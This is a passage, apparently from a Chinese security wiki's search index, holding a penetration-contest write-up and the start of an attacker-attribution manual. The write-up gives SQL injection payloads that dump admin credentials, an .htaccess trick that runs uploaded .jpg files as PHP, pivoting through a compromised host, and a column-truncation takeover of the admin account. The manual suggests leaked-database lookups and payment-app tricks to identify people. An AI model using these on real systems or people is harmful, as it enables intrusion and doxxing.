\u66b4\u8868\uff1a select table_name from information_schema.tables where table_schema=database() insert into liuyan values ('\u904b' , (select table_name from information_schema.tables where table_schema=database() limit 0,1))##' , 'e') \u66b4\u5b57\u6bb5\uff1a insert into liuyan values ('\u904b' , (selEct GrouP_coNCat(COLUMN_NAME) fRom information_schEma.COLUMNS where TABLE_NAME=0x61646d696e limit 0,1))##' , 'e') \u6570\u636e\u5e93 hacker \u8868:liuyan , admin admin\u5b57\u6bb5\uff1auser,pass \u66b4\u6570\u636e\uff1a selEct GrouP_coNCat(user,0x2D002D00,pass) fRom admin as ww limit 0,1 insert into liuyan values ('\u904b' , (selEct GrouP_coNCat(user,0x2D002D00,pass) fRom admin limit 0,1))##' , 'e') \u5176\u5b9e\u6211\u5f88\u60f3\u7528sqlmap\u8fdb\u884c\u6ce8\u5165 \u56e0\u4e3a\u4e0a\u9762\u7684\u89c4\u5219\u6ca1\u6709\u8bf4\u4e0d\u80fd \u7528sqlmap \u4f46\u662fsqlmap\u597d\u50cf\u4e0d\u652f\u6301values\u6ce8\u5165\uff0c\u6ce8\u5165\u7684\u65f6 \u5019\u5c45\u7136\u68c0\u6d4b\u4e0d\u51fa\u6765\u3002 \u7136\u540e\u6211\u95ee\u4e86\u4e00\u4e2a\u5927\u795e\u3002 \u7136\u540e\u767b\u5f55\u540e\u53f0\uff1a \u5bc6\u7801\u9519\u8bef\uff1f\uff1f\u8fd9\u91cc\u6211\u62bd\u6839\u70df\u82b1\u4e8610\u5206\u949f\u5728\u60f3\u539f\u7406\uff08\u56e0\u4e3a\u6211\u6574 \u4e2a\u6570\u636e\u5e93\u90fd\u7ffb\u904d\u4e86\uff09 \u7136\u540e\u67e5\u770b\u6e90\u7801\u3002\u3002\u3002 \u8fd8\u597d \u6211\u61c2js\u3002\u3002\u3002\u4e0d\u7136\u5c31\u6c38\u8fdc\u5361\u5728\u8fd9\u4e86\u3002\u3002 \u4e00\u4e2a\u70b9\u51fb\u4e8b\u4ef6\u89e6\u53d1\u4e00\u4e2a\u51fd\u6570\u7136\u540e\u4f60\u7684cookie\u540d\u79f0tem\u7684\u503c\u4e0d \u7b49\u4e8ehacker\u7684\u8bdd \u90a3\u4e48\u5c31\u8f93\u51fa\u4e00\u53e5\u8bdd \u7136\u540efalse \u4e0d\u518d\u6267\u884c\u3002 \u7136\u540e\u6211\u7981\u7528\u6389\u4e86js \u8fdb\u884c\u767b\u5f55\u53d1\u73b0\u8fd8\u662f\u767b\u5f55\u4e0d\u4e86\u3002\u3002\u96be\u4e0d\u6210\u4e5f \u5728\u540e\u53f0\u505a\u9650\u5236\u4e86\uff1f\u597d\u5427\u3002\u8fd8\u662f\u8001\u8001\u5b9e\u5b9e\u7684\u5b9a\u4e49cookie \u5427\u3002 \u767b\u5f55\u4e4b\u540e\u662f\u4e2a\u4e0a\u4f20\u3002\u4e0d\u8fc7\u9700\u8981\u63d0\u4f9b\u4e0a\u4f20\u8def\u5f84\u3002 \u83b7\u53d6\u4e0a\u4f20\u8def\u5f84\u67092\u79cd\u65b9\u6cd5\u3002 \u7b2c\u4e00\u79cd \u56e0\u4e3a\u5b58\u5728sql\u6ce8\u5165 \u6240\u4ee5\u628a\u90a3\u4e2a\u7559\u8a00\u7684\u6570\u636e\u5168\u90e8\u5220\u6389\uff0c \u770b\u770b\u62a5\u4e0d\u62a5\u9519\uff0c\u56e0\u4e3a\u6211\u53d1\u73b0\u597d\u591a\u7a0b\u5e8f\u5458\u5728\u524d\u7aef\u8f93\u51fa\u6570\u636e\u7684\u65f6 \u5019\u6839\u672c\u4e0d\u5224\u65ad\u6570\u636e\u662f\u5426\u4e3a\u7a7a\u5c31\u76f4\u63a5\u904d\u5386\u4e86\u3002 \u7b2c\u4e8c\u79cd \u56e0\u4e3a\u5b58\u5728sql\u6ce8\u5165 \u6240\u4ee5\u8bfb\u53d6\u670d\u52a1\u5668\u914d\u7f6e\u6587\u4ef6\u67e5\u770b\u8def\u5f84 \u5f53\u7136\u5982\u679c\u9ed8\u8ba4\u8def\u5f84\u6ca1\u6539\u7684\u8bdd\u3002 ubuntu apache \u7684\u914d\u7f6e\u6587\u4ef6\u8def\u5f84 /etc/apache2/apache2.conf selEct load_file(0x2f6574632f617061636865322f6170616 36865322e636f6e6620) \u7ecf\u8fc7\u6d4b\u8bd5 \u662f\u9ed1\u540d\u5355\u9a8c\u8bc1 \u7136\u540e\u5229\u7528 .htaccess \u4e0a\u4f20 \u65b0\u5efa\u4e2a .htaccess\u6587\u4ef6\u5185\u5bb9: ForceType application/x\u00adhttpd\u00adphp SetHandler application/x\u00adhttpd\u00adphp \u5728\u4ed6\u5f53\u524d\u76ee\u5f55\u4e0b \u53ea\u8981\u662f\u4ee5jpg\u7ed3\u5c3e\u7684 \u90fd\u4f1a\u4ee5PHP\u7a0b\u5e8f\u53bb\u89e3\u6790 mac os x \u6e17\u900f\u597d\u9ebb\u70e6\uff0c\u56e0\u4e3a\u6ca1\u73af\u5883\u3002\u3002\u3002\u3002\u6316\u6f0f\u6d1e\u8fd8\u53ef \u4ee5\u3002\u3002\u54ce\u3002\u8fd9\u5de5\u5177\u5361\u5728\u8fd9\u4e86\uff0c\u5e73\u65f6\u90fd\u80fd\u7528\u7684\uff0c\u4eca\u5929\u6362\u4e86jpg \u5c31\u5361\u8fd9\u4e86\u3002\u5e0c\u671b\u770b\u5230\u7684\u53cd\u9988bug\u7ed9\u8fd9\u4e2a\u4f5c\u8005\u3002\u3002 \u7136\u540e\u65b0\u5efa\u4e00\u4e2a\u770b\u770b\u3002 \u8fd9\u6743\u9650\u597d\u50cf\u6709\u70b9\u4e0d\u79d1\u5b66\u3002\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u51fa\u9898\u5b98\u6545\u610f\u7684\u3002\u3002\u3002 \u4e0b\u8f7d\u4e2anc \u8fdb\u884c\u8f6c\u53d1 \u5f88\u591a\u4eba\u90fd\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\u8981\u7528nc\u8f6c\u53d1\uff0c\u96be\u5230\u7528\u83dc\u5200\u6765\u6267\u884c\u547d\u4ee4 \u4e0d\u662f\u65b9\u4fbf\u70b9\u561b\uff1f \u8fd9\u70b9\u6211\u5f97\u8bf4\u4e00\u4e0b\u865a\u62df\u5316\u7684\u6267\u884c\u547d\u4ee4\u7684\u533a\u522b\u3002\u5c31\u6bd4\u5982\uff1a \u770b\u5230\u533a\u522b\u5728\u54ea\u4e86\u5427\uff1f \u524d\u9762\u6211\u63a8\u65ad192.168.1.6 \u5e94\u8be5\u505a\u4e86\u767d\u540d\u5355 \u6240\u4ee5\u6211\u7684\u601d\u8def\u662f \u60f3\u901a\u8fc7\u8fd9\u4e2a\u8089\u9e21\u6765\u4ee3\u7406\u8fdb\u884c\u8bbf\u95ee\u7136\u540e\u518d\u6e17\u900f\u3002 \u7136\u540e\u8089\u9e21\u4e0a\u7684Socks \u5df2\u7ecf\u5b89\u88c5\u6210\u529f \u4f46\u662f\u6211\u81ea\u5df1\u7684mac os x\u5374\u5b89\u88c5\u5931\u8d25 \u4e0akali\u5427 kali\u5c31\u662fubuntu.... \u54c8\u54c8 \u5f00\u5fc3\u6b7b\u4e86\u3002\u5c45\u7136\u8ddf\u6211\u60f3\u7684\u4e00\u6837\u3002\u3002 http://192.168.1.6/admin.php \u5e94\u8be5\u662f\u540e\u53f0\u767b\u5f55\u3002 http://192.168.1.6/register.php \u8fd9\u662f\u6ce8\u518c\u7684\u3002\u3002\u3002 \u8fd9\u91cc\u6211\u82b1\u4e86\u6574\u6574\u5dee\u4e0d\u591a30\u5206\u949f\u624d\u641e\u5b9a\u3002 \u4f60\u60f3\u554a\u3002\u4ed6\u5c31\u7ed9\u4f60\u4e00\u4e2a\u767b\u5f55\u4e00\u4e2a\u6ce8\u518c\uff0c\u7136\u540e\u63d0\u793a\u7ba1\u7406\u5458\u7684\u8d26 \u53f7\u662fadmin\u3002 \u7136\u540e\u6211\u53c8\u60f3\u5230\u4e86\u6211\u4ee5\u524d\u770b\u8fc7\u4e00\u672c\u4e66 \u5c31\u662f\u767d\u5e3d\u5b50\u8bb2\u89e3web\u5b89 \u5168\u3002\u3002 \u8fd9\u4e2a\u662fmy.ini\u7684\u6f0f\u6d1e\u3002 sql\ufffemode=\"NO_AUTO_CREATE_USER,NO_ENGINE_SU BSTITUTION\" \u6211\u8fd8\u662f\u8bf4\u4e00\u4e0b\u539f\u7406\u5427\u3002\u3002\u3002\u3002 \u6bd4\u5982\u4e00\u4e2a\u8868\u7684\u7ed3\u6784\u662f\u8fd9\u6837\u7684\uff1a create table admin( username varchar(10) not null, passwd varchar(10) not null)\u037e \u53ef\u4ee5\u770b\u5230username\u8ddfpasswd\u7684\u5b57\u8282\u4e3a10 \u4f46\u662f\u8fd9my.ini \u8bbe\u7f6e\u6210 sql\ufffemode=\"NO_AUTO_CREATE_USER,NO_ENGINE_SU BSTITUTION\"\u7684\u8bdd \u5c31\u7b97\u8d85\u51fa\u4e5f\u4f1a\u6dfb\u52a0\u6210\u529f \u6bd4\u5982\uff1a insert into admin values(\u20181234567891 2\u2019,and)\u037e \u4ed6\u4e0d\u4f1a\u63d2\u5165\u201c1234567891 2 \u201d\u800c\u662f\u63d2 \u201d1234567891\u201c \u56e0\u4e3a\u6307\u9488\u52301\u7684\u65f6\u5019\u5b57\u8282\u5c31\u7b49\u4e8e10 \u4e86\u3002\u3002\u3002 \u6700\u540e\u5f97\u5230\u5bc6\u94a5\uff1aadkbdf!@#dmejfn^&*! \u9664\u4e86\u7b2c\u4e00\u8282\u53ef\u4ee5\u5b8c\u6210 \u5176\u5b83\u90fd\u662f\u5b8c\u6210\u4e0d\u4e86\u7684\u3002 (\u4e2a\u4eba\u8d5b)","title":"\u7b2c\u4e00\u8282\uff1a"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E5%86%85%E9%83%A8%E6%B8%97%E9%80%8F%E6%AF%94%E8%B5%9B/#_2","text":"title:app\u53cd\u7f16\u8bd1\u67e5\u627e\u6f0f\u6d1e \u89c4\u5219\uff1a\u4e0d\u5f97\u6c42\u52a9\u522b\u4eba\uff0c\u5168\u8fc7\u7a0b\u9700\u8981\u5c4f\u5e55\u5f55\u50cf\u3002","title":"\u7b2c\u4e8c\u8282\uff1a"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E5%86%85%E9%83%A8%E6%B8%97%E9%80%8F%E6%AF%94%E8%B5%9B/#_3","text":"title:\u4fee\u6539Sqlmap\u6e90\u7801 ps: http://www.demo.com/1.php?id=1 \u5b58\u5728SQL\u6ce8\u5165 \u4e0d\u8fc7select from \u5355\u5f15\u53f7 union \u90fd\u88ab \u8fc7\u6ee4\u4e86\uff0c\u800c\u4f60\u4eec\u8981\u505a\u7684\u5c31\u662f\u901a\u8fc7SQLMAP\u8fdb\u884c\u6ce8\u5165\u3002 \u89c4\u5219\uff1a\u4e0d\u5f97\u6c42\u52a9\u522b\u4eba\uff0c\u5168\u8fc7\u7a0b\u9700\u8981\u5c4f\u5e55\u5f55\u50cf\u3002 \uff08\u56e2\u961f\u8d5b\uff09","title":"\u7b2c\u4e09\u8282\uff1a"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E5%86%85%E9%83%A8%E6%B8%97%E9%80%8F%E6%AF%94%E8%B5%9B/#_4","text":"title\uff1a\u53cd\u9ed1\u5ba2\uff0c\u6293\u9ed1\u5ba2\u3002 ps:\u67d0\u516c\u53f8\u51cc\u66683\u70b946\u5206\u7cdf\u5230\u4e0d\u660e\u9ed1\u5ba2\u5165\u4fb5\uff0c\u6570\u636e\u6cc4\u9732\u3002\u800c \u4f60\u4eec\u8981\u505a\u7684\u5c31\u662f \u5b9a\u4f4d\u4ed6\uff0c\u627e\u5230\u4ed6\uff0c\u902e\u6355\u4ed6\u3002 \u89c4\u5219\uff1a\u6ca1\u4efb\u4f55\u89c4\u5219\u3002 \u56e0\u4e3a2\uff5e4\u90fd\u5931\u8d25\u4e86\uff0c\u6240\u4ee5\u5c31\u6ca1\u5199\u4e86\u3002 \u7b2c\u4e8c\u8282\u5931\u8d25\u539f\u56e0\uff1a\u5229\u7528dex2jar jdgui\u8fdb\u884c\u53cd\u7f16\u8bd1\u5f97\u5230\u6e90 \u7801\uff0c\u7136\u540e\u3002\u3002\u3002\u770b\u4e0d\u61c2java\u8bed\u8a00 \u53c8\u627e\u4e0d\u5230\u4e00\u4e9b\u654f\u611f\u7684\u6587\u4ef6 \u6240\u4ee5\u5931\u8d25\u3002 \u7b2c\u4e09\u8282\u5931\u8d25\u539f\u56e0\uff1a\u4fee\u6539\u4e86sqlmap\u6e90\u7801\u5c31\u5b58\u5728\u5404\u79cdbug\u3002\u800c \u4e14\u6709\u90e8\u5206\u6e90\u7801\u8fd8\u770b\u4e0d\u61c2\uff0c\u56e0\u4e3a\u592a\u591a\u6a21\u5757\u90fd\u6ca1\u7528\u8fc7\u3002\u6240\u4ee5\u9009\u62e9 \u653e\u5f03\u3002 \u7b2c\u56db\u8282\u5931\u8d25\u539f\u56e0\uff1a\u9ed1\u5ba2\u5165\u4fb5\u4e86\u670d\u52a1\u5668\u7136\u540e\u4fee\u6539apache\u65e5\u5fd7 \u6e05\u7a7a\uff0c\u7136\u540e\u518d\u5220\u9664\uff0c\u7136\u540e\u53c8\u5199\u4e2a\u811a\u672c\u5f00\u673a\u542f\u52a8\uff0c\u5f00\u673a\u540e\u5c31\u4f1a \u8fd0\u884c\u7a0b\u5e8f\u5220\u9664\u670d\u52a1\u5668\u65e5\u5fd7\u7b49\uff0c\u6211\u4eec\u8fd8\u539f\u4e86iis\u65e5\u5fd7\u540e \u6587\u4ef6\u662f \u7a7a\u7684\u3002\u6298\u817e\u4e86\u51e0\u5c0f\u65f6\u4e4b\u540e\u9009\u62e9\u653e\u5f03\u3002\uff08\u4e0d\u8fc7\u67091\u4e2a\u6210\u5458\u6210\u529f \u83b7\u53d6\u5230\u4e86\u5165\u4fb5\u8005ip \u6d41\u7a0b\u597d\u50cf\u662f\u5165\u4fb5\u4e86vpn\u670d\u52a1\u5668\u4e4b\u540e\u6536\u96c6\u9ed1 \u5ba2\u7684\u811a\u5370\uff0c\u83b7\u53d6\u4e86\u9ed1\u5ba2\u7684qq \u6700\u540e\u6210\u529f\u83b7\u53d6\u5230\u9ed1\u5ba2ip \u624b\u673a\u53f7 \u7801 \u5e38\u7528\u5bc6\u7801 \u5728\u54ea\u5de5\u4f5c\u3002\u6211\u5f88\u597d\u5947\u7684\u95ee\u4ed6 \u4f60\u662f\u600e\u4e48\u8fd8\u539f\u6587\u4ef6 \u5185\u5bb9\u7684\u3002\u4ed6\u8ddf\u6211\u8bf4\u4e86\u4e00\u5927\u5806\u3002\u6211\u4e00\u70b9\u90fd\u542c\u4e0d\u61c2\u3002\u3002\u3002\u3002\uff09","title":"\u7b2c\u56db\u8282\uff1a"},{"location":"%E5%AE%9E%E6%88%98%E7%9B%B8%E5%85%B3/%E6%BA%AF%E6%BA%90%E6%89%8B%E5%86%8C/","text":"\u6eaf\u6e90\u624b\u518c \u672c\u6eaf\u6e90\u624b\u518c\uff0c\u5206\u6280\u5de7\u4e0e\u5b9e\u6218\u4e24\u5927\u7bc7\u5e45\u65e8\u5728\u5e2e\u52a9\u5927\u5bb6\u53ef\u4ee5\u5feb\u901f\u4e0a\u624b\u5e76\u5728\u5b9e\u6218\u4e2d\u8fd0\u7528\uff0c\u4e5f\u53ef\u5145\u5f53\u5b57\u5178\u7684\u4f5c\u7528\uff0c\u5728\u6eaf\u6e90\u8fc7\u7a0b\u4e2d\u53ef\u4ee5\u7ffb\u4e00\u7ffb\uff0c\u66f4\u5168\u9762\u7684\u6eaf\u6e90\uff0c\u6545\u67d0\u4e9b\u5185\u5bb9\u53ef\u80fd\u4f1a\u7b80\u5316\u3002 \u6280\u5de7\u7bc7 \u00b6 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u63a5\u5230\u6eaf\u6e90\u4efb\u52a1\u65f6\uff0c\u83b7\u5f97\u7684\u4fe1\u606f\u5982\u4e0b \u653b\u51fb\u65f6\u95f4\\ \u653b\u51fbIP\\ \u9884\u8b66\u5e73\u53f0\\ \u653b\u51fb\u7c7b\u578b\\ \u6076\u610f\u6587\u4ef6\\ \u53d7\u653b\u51fb\u57df\u540d/IP \u5176\u4e2d\u653b\u51fbIP\u3001\u653b\u51fb\u7c7b\u578b\u3001\u6076\u610f\u6587\u4ef6\u3001\u653b\u51fb\u8be6\u60c5\u662f\u6eaf\u6e90\u5165\u624b\u7684\u70b9\u3002 \u901a\u8fc7\u653b\u51fb\u7c7b\u578b\u5206\u6790\u653b\u51fb\u8be6\u60c5\u7684\u8bf7\u6c42\u5305\uff0c\u770b\u6709\u6ca1\u6709\u653b\u51fb\u8005\u7279\u5f81\uff0c\u901a\u8fc7\u83b7\u53d6\u5230\u7684IP\u5730\u5740\u8fdb\u884c\u5a01\u80c1\u60c5\u62a5\u67e5\u8be2\u6765\u5224\u65ad\u6240\u7528\u7684IP\u5177\u4f53\u662f\u4ee3\u7406IP\u8fd8\u662f\u771f\u5b9eIP\u5730\u5740\u3002 \u5982\u7aef\u53e3\u626b\u63cf\u5927\u6982\u7387\u4e3a\u4e2a\u4ebavps\u6216\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\uff0c\u5728\u63a5\u5230\u5927\u91cf\u6eaf\u6e90\u4efb\u52a1\u65f6\u53ef\u4f18\u5148\u6eaf\u6e90\u3002 \u5982\u547d\u4ee4\u6267\u884c\u5927\u6982\u7387\u4e3a\u672a\u7ecf\u4efb\u4f55\u9690\u533f\u7684\u7f51\u7edc\u3001\u79fb\u52a8\u7f51\u7edc\u3001\u63a5\u5230\u811a\u672c\u626b\u63cf\u4efb\u52a1\u7684\u8089\u9e21\uff0c\u5728\u63a5\u5230\u5927\u91cf\u6eaf\u6e90\u4efb\u52a1\u65f6\u53ef\u4f18\u5148\u6eaf\u6e90\u3002 \u5982\u722c\u866b\u5927\u6982\u7387\u4e3a\u7a7a\u95f4\u641c\u7d22\u5f15\u64ce\uff0c\u53ef\u653e\u5230\u6700\u540e\u6eaf\u6e90\u3002 \u5982\u6076\u610f\u6587\u4ef6\u53ef\u83b7\u5f97c2\u5730\u5740\u3001\u672a\u5220\u9664\u7684\u5e26\u6709\u654f\u611f\u4fe1\u606f\u7684\u4ee3\u7801\uff08\u5982\u5e38\u7528ID\u3001\u7ec4\u7ec7\u4fe1\u606f\uff09\u3001\u6301\u7eed\u5316\u63a7\u5236\u4ee3\u7801\uff08C2\u5730\u5740\u6307\u5728APT\u653b\u51fb\u91cc\u7684\u547d\u4ee4\u4e0e\u63a7\u5236\uff0c\u82e5\u83b7\u53d6\u5230C2\u5730\u5740\u53ef\u4ee5\u4f7f\u6211\u4eec\u7684\u6eaf\u6e90\u76ee\u6807\u66f4\u6709\u9488\u5bf9\u6027\uff09 \u6301\u7eed\u5316\u63a7\u5236\u4ee3\u7801\u9700\u8981\u8be6\u7ec6\u5206\u6790\uff0c\u5982\u91c7\u7528DGA\u57df\u540d\u4e0a\u7ebf\u7684\u65b9\u6cd5\uff0c\u5206\u6790\u51fa\u57df\u540d\u7b97\u6cd5\uff0c\u9884\u6d4b\u4e4b\u540e\u7684\u57df\u540d\u53ef\u6709\u6548\u51cf\u5c11\u635f\u5931\uff0c\u589e\u52a0\u6eaf\u6e90\u9762\u3002 \u6eaf\u6e90\u7ed3\u679c\u6846\u67b6 \u00b6 \u5728\u53d7\u5230\u653b\u51fb\u3001\u626b\u63cf\u4e4b\u540e\uff0c\u8fdb\u884c\u4e00\u7cfb\u5217\u6eaf\u6e90\u64cd\u4f5c\u540e\uff0c\u7406\u60f3\u60c5\u51b5\u4e0b\u60f3\u8981\u83b7\u5f97\u5982\u4e0b\u6570\u636e\uff0c\u6765\u523b\u753b\u653b\u51fb\u8005\u753b\u50cf\u3002 \u59d3\u540d/ID\uff1a\\ \u653b\u51fbIP\uff1a\\ \u5730\u7406\u4f4d\u7f6e\uff1a\\ QQ:\\ \u5fae\u4fe1\uff1a\\ \u90ae\u7bb1\uff1a\\ \u624b\u673a\u53f7\uff1a\\ \u652f\u4ed8\u5b9d\uff1a\\ IP\u5730\u5740\u6240\u5c5e\u516c\u53f8\uff1a\\ IP\u5730\u5740\u5173\u8054\u57df\u540d\uff1a\\ \u5176\u4ed6\u793e\u4ea4\u8d26\u53f7\u4fe1\u606f\uff08\u5982\u5fae\u535a/src/id\u8bc1\u660e\uff09\uff1a\\ \u4eba\u7269\u7167\u7247\uff1a\\ \u8df3\u677f\u673a\uff08\u53ef\u9009\uff09\uff1a\\ \uff08ps\uff1a\u4ee5\u4e0a\u4e3a\u6700\u7406\u60f3\u7ed3\u679c\u60c5\u51b5\uff0c\u6eaf\u6e90\u5230\u540d\u5b57\u516c\u53f8\u52a0\u5206\u6700\u9ad8\uff09 \u5728\u5199\u6eaf\u6e90\u62a5\u544a\u65f6\uff0c\u5e94\u907f\u514d\u5355\u4e00\u9762\u77f3\u9524\uff0c\u9700\u8981\u53cd\u590d\u9a8c\u8bc1\uff0c\u907f\u514d\u4e2d\u9014\u6eaf\u6e90\u9519\u4eba\uff0c\u5404\u4e2a\u6eaf\u6e90\u7ebf\u7d22\u53ef\u4ee5\u4e32\u8d77\u6765\uff0c\u8981\u5177\u6709\u903b\u8f91\u6027\u3002 \u6eaf\u6e90\u5e38\u7528\u624b\u6cd5 \u00b6 \u672c\u8282\u5c06\u6309\u7167\u83b7\u53d6\u5230\u7684\u6570\u636e\u5c55\u5f00\u5206\u6765\u6765\u8bb2\uff0c\u6700\u540e\u53ef\u80fd\u878d\u4f1a\u8d2f\u901a\uff0c\u4e92\u76f8\u9002\u7528\u3002 \u5a01\u80c1\u60c5\u62a5\u5e73\u53f0 https://x.threatbook.cn/ \\ https://ti.qianxin.com/ \\ https://ti.360.cn/ \\ https://www.venuseye.com.cn/ \u4e0d\u8981\u8fc7\u4e8e\u4f9d\u8d56\u5a01\u80c1\u60c5\u62a5\uff0c\u4ec5\u4f9b\u53c2\u8003 \u5e73\u53f0\u5927\u591a\u4e3a\u793e\u533a\u7ef4\u62a4\uff0c\u5b58\u5728\u8bef\u62a5\u4ee5\u53ca\u65f6\u6548\u6027\u95ee\u9898\uff0c\u53ef\u80fd\u6700\u540e\u8ddf\u771f\u6b63\u653b\u51fb\u8005\u6beb\u65e0\u5173\u7cfb\u3002 \u5df2\u77e5\u57df\u540d\u83b7\u53d6\u4fe1\u606f \u00b6 \u5386\u53f2whois \u00b6 \u901a\u8fc7\u5a01\u80c1\u60c5\u62a5\u5e73\u53f0\u6211\u4eec\u53ef\u4ee5\u83b7\u53d6\u57df\u540d\u89e3\u6790\u8bb0\u5f55\u3001\u5386\u53f2whois\u3001\u5b50\u57df\u540d\u3001SSL\u8bc1\u4e66\u7b49\u5982\u56fe\uff1a https://whois.chinaz.com/reverse?ddlSearchMode=4 https://community.riskiq.com/ \u53ef\u83b7\u5f97 ID \u59d3\u540d \u90ae\u7bb1 SSL\u8bc1\u4e66 \u00b6 \u53ef\u83b7\u5f97 ID \u90ae\u7bb1 \u89e3\u6790\u8bb0\u5f55 \u00b6 \u901a\u8fc7\u89e3\u6790\u8bb0\u5f55\u53ef\u4ee5\u83b7\u5f97\u57df\u540dA\u8bb0\u5f55\u4ece\u800c\u83b7\u53d6\u5230\u57df\u540d\u540e\u7684IP\u5730\u5740\u3002 A\u8bb0\u5f55 ------ \u6620\u5c04\u57dfbai\u540d\u5230\u4e00\u4e2a\u6216\u591a\u4e2aIP CNAME------ \u6620\u5c04\u57df\u540d\u5230\u53e6\u4e00\u4e2a\u57df\u540d\uff08\u5b50\u57df\u540d\uff09 \u57df\u540d\u89e3\u6790\u8bb0\u5f55\uff1a http://www.jsons.cn/nslookup/ \u5168\u7403ping\uff0c\u67e5\u770b\u73b0\u7ed1\u5b9aip\uff0c\u770b\u662f\u5426\u57df\u540d\u4f7f\u7528\u4e86CDN\u6280\u672f\u3002 http://ping.chinaz.com/ fofa \u5df2\u77e5IP\u83b7\u53d6\u4fe1\u606f \u00b6 \u53cd\u67e5\u57df\u540d \u00b6 \u5a01\u80c1\u60c5\u62a5\u5e73\u53f0 https://www.ipip.net/ip.html https://www.aizhan.com/ https://www.whois.com/ IP\u4fe1\u606f \u00b6 \u5a01\u80c1\u60c5\u62a5\u5e73\u53f0 https://www.ipip.net/ http://ipwhois.cnnic.net.cn/index.jsp \u53ef\u83b7\u5f97 \u662f\u5426\u4e3a\u79fb\u52a8\u7f51\u7edc\u3001IDC\u7b49 IP\u6bb5\u6240\u5c5e\u516c\u53f8 IP\u5b9a\u4f4d \u00b6 https://chaipip.com/ https://www.opengps.cn/Data/IP/ipplus.aspx \u5df2\u77e5ID/\u59d3\u540d/\u624b\u673a\u53f7/\u90ae\u7bb1\u83b7\u53d6\u4fe1\u606f \u00b6 \u624b\u673a\u53f7/\u90ae\u7bb1 \u00b6 sgk \u67e5\u652f\u4ed8\u5b9d\u8f6c\u8d26\uff0c\u9a8c\u8bc1\u59d3\u540d\u3002 \u901a\u8fc7\u90e8\u5206\u5e73\u53f0\u8d26\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u53ef\u731c\u624b\u673a\u53f7\u3002 QQ\u6dfb\u52a0\u597d\u53cb\u641c\u7d22 \u5fae\u4fe1\u6dfb\u52a0\u597d\u53cb\u641c\u7d22 https://www.reg007.com/ \u793e\u4ea4\u5e73\u53f0\u67e5\u627e\uff08\u6296\u97f3\u3001\u8109\u8109\u641c\u7d22\u7b49\uff09 ID/\u59d3\u540d \u00b6 sgk \u8c37\u6b4c/\u767e\u5ea6 src\u641c\u7d22 \u5fae\u535a\u641c\u7d22 \u8d34\u5427\u641c\u7d22 \u793e\u4ea4\u5e73\u53f0\u67e5\u627e\uff08\u6296\u97f3\u3001\u8109\u8109\u641c\u7d22\u7b49\uff09 \u6076\u610f\u6587\u4ef6 \u00b6 \u6076\u610f\u6587\u4ef6\u901a\u5e38\u4f1a\u4ece\u90ae\u4ef6\u7684\u8def\u5f84\u83b7\u5f97\uff0c\u53ef\u4ee5\u5c06\u90ae\u4ef6\u5168\u683c\u5f0f\u4fdd\u5b58\uff0c\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u67e5\u770b\uff0c\u53ef\u4ee5\u83b7\u5f97\u53d1\u9001\u90ae\u4ef6IP\u5730\u5740\u3002 \u9700\u8981\u51c6\u5907\u7684\u5de5\u5177 \u00b6 \u9006\u5411\u7c7b \u00b6 Ida JEB \u6587\u4ef6\u7f16\u8f91\u7c7b 010 editor Winhex \u7f51\u7edc\u3001\u8fdb\u7a0b\u76d1\u63a7\u7c7b \u00b6 processmonitor Wireshark \u79d1\u6765\u7f51\u7edc\u5206\u6790\u7cfb\u7edf SRsniffer \u56fa\u4ef6\u5206\u6790\u7c7b \u00b6 Binwalk BIN2BMP PIXD \u5728\u7ebf\u6c99\u7bb1 \u00b6 \u5fae\u6b65\u4e91\u6c99\u7bb1 https://s.threatbook.cn/ \u5947\u5b89\u4fe1\u4e91\u6c99\u7bb1 https://sandbox.ti.qianxin.com/sandbox/page \u817e\u8baf\u54c8\u52c3 https://habo.qq.com/ Joe Sandbox\uff1a https://www.joesandbox.com/ \u5e38\u89c4\u6eaf\u6e90\u624b\u6cd5 \u00b6 \u6587\u4ef6\u8bc6\u522b \u00b6 \u5e38\u89c1\u7684\u53ef\u6267\u884c\u7a0b\u5e8f\u683c\u5f0f\u6709PE\uff0cELF\uff0cMACH-O\u7b49\uff0c\u4e0d\u540c\u7684\u683c\u5f0f\u6709\u4e0d\u540c\u7684\u6807\u5fd7\u4fe1\u606f\uff08\u53c2\u8003\u7406\u8bba\u7bc7\uff09\uff0c\u77e5\u9053\u4e86\u76ee\u6807\u6587\u4ef6\u7684\u683c\u5f0f\u540e\u624d\u80fd\u786e\u5b9a\u5bf9\u5e94\u7684\u5206\u6790\u65b9\u6cd5\u548c\u5206\u6790\u5de5\u5177\u3002 \u53ef\u4ee5\u4f7f\u752816\u8fdb\u5236\u89e3\u6790\u5668\u8f7d\u5165\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u7136\u540e\u67e5\u770b\u662f\u54ea\u79cd\u7c7b\u578b\u7684\u6587\u4ef6\u3002 \u4e00\u822c\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u524d\u56db\u4e2a\u5b57\u8282\u4e3a\u6587\u4ef6\u683c\u5f0f\u7684magic\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ece\u7f51\u7edc\u641c\u7d22\u83b7\u5f97\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u6216\u8005\u4f7f\u7528\u76f8\u5173\u7684\u5de5\u5177\uff08PEID\uff0cfile\uff09\u7b49\u8fdb\u884c\u81ea\u52a8\u8bc6\u522b\u3002 \u8ba1\u7b97\u54c8\u5e0c\u503c \u00b6 